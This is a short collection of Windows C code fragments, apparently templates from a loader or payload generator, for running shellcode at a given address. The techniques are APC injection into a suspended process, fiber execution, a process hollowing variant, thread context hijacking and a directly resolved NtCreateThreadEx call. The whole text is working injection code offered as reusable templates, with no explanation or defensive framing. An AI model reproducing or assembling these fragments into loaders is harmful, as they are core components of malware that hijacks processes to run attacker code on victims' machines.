executors.code_template:
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);
ResumeThread(pi.hThread);

ConvertThreadToFiber(NULL);
LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL);
SwitchToFiber(fiber);

// Process hollowing variant
CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
GetThreadContext(pi.hThread, &ctx);
// Modify RIP to point to shellcode
ctx.Rip = (DWORD64)addr;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);

HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
SuspendThread(hThread);
CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)addr;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);

typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,
    LPTHREAD_START_ROUTINE, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID);
pNtCreateThreadEx NtCTE = (pNtCreateThreadEx)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
HANDLE hThread;
NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
    (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL);
